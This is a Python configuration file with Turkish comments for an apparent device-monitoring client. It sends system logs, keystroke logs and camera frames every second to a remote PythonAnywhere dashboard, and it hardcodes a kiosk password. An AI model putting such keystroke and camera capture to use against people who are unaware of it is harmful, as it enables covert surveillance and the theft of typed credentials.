"""
config.py  –  Merkezi Yapılandırma
===================================
Tüm modüller bu dosyadan import eder.
Dashboard sunucu adresini buradan değiştirin.
"""

# ── Sunucu Adresi ─────────────────────────────────────────────────────────────
# PythonAnywhere kullanıyorsanız:  "https://kullaniciadiniz.pythonanywhere.com"
# Yerel ağda test için:            "http://192.168.1.XX:5000"
DASHBOARD_URL = "https://shinsoo.pythonanywhere.com"

# ── Cihaz Kimliği ─────────────────────────────────────────────────────────────
# Her cihaz için benzersiz olmalı. Otomatik MAC bazlı üretilir,
# manuel olarak da belirtilebilir: DEVICE_ID = "OFIS-PC-01"
DEVICE_ID = None   # None → otomatik

# ── Gönderim Ayarları ─────────────────────────────────────────────────────────
SEND_INTERVAL_SEC  = 1      # kaç saniyede bir veri gönderilsin
SEND_LOGS          = True   # sistem logları gönderilsin mi
SEND_KEYLOG        = True   # klavye logları gönderilsin mi
SEND_CAMERA_FRAME  = True   # kamera frame'i gönderilsin mi
CAMERA_JPEG_QUALITY = 40    # JPEG sıkıştırma kalitesi (1-95); düşük = daha az bant genişliği
CAMERA_FACING      = "BACK" # "BACK" veya "FRONT"

# ── Zaman Aşımı ───────────────────────────────────────────────────────────────
REQUEST_TIMEOUT_SEC = 5

# ── Güvenlik ──────────────────────────────────────────────────────────────────
KIOSK_PASSWORD = "gokhan"
